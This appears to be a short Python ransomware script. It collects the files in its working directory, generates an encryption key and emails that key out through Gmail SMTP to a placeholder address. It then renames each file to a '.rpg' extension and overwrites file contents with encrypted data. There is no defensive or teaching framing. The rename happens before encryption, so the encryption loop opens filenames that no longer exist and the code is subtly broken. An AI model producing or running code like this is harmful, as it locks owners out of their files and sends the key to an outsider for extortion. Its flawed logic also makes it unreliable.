import os
from cryptography.fernet import Fernet
import smtplib

file_list = []

for file in os.listdir():
    if file == "main.py" or file == "generatedkey.key":
        continue

    if os.path.isfile(file):
        file_list.append(file)


key = Fernet.generate_key()

def send_email(email, app_password, message):
    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as email_server:
            email_server.starttls()
            email_server.login(email, app_password)
            email_server.sendmail(email, email, message)
            # SMTP sunucuyla bağlantının kapatılması
            email_server.quit()
    except Exception as e:
        print(f"Error sending email: {e}")


send_email("user@gmail.com", "app_password", key)

def change_file_extension(new_extension):
    for file in file_list:
        base_name, _ = os.path.splitext(file)
        new_filename = f"{base_name}.{new_extension}"
        try:
            os.rename(file, new_filename)
        except Exception as e:
            print(f"Hata {e}")


change_file_extension("rpg")

for file in file_list:
    with open(file, "rb") as the_file:
        contents = the_file.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as the_file:
        the_file.write(contents_encrypted)
